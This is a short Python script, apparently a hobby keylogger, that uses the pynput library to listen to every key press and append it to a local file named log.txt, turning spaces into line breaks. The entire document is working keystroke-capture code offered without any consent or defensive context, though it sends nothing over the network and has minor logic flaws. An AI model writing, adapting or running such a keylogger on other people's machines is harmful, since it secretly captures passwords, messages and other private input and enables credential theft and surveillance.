from pynput.keyboard import Key, Listener,Controller
import os

# To create a Text file Log.txt if it is not present in in directory
if os.path.isfile("log.txt"):
    pass
else:
    with open("log.txt","w") as f:
        pass

# It stores the key strokes of the user keyboard
keys_store= []

# This funtion append the Keystrokes to the text file
def saveKey():
    global keys_store
    with open("log.txt","a") as f:
        if len(keys_store) >= 0:
            for word in keys_store:
                print(word)
                if word == "Key.space":
                    f.write("\n")
                else:
                    replaced = word.replace("'","")
                    f.write(replaced)
                    keys_store.clear()


# This function get the user keystrokes and save in the Given list 
def on_press(key):
    global keys_store
    keys_store.append(str(key))
    saveKey()
# This process listners the keystrokes of the user
with Listener(on_press= on_press) as l:
    l.join()


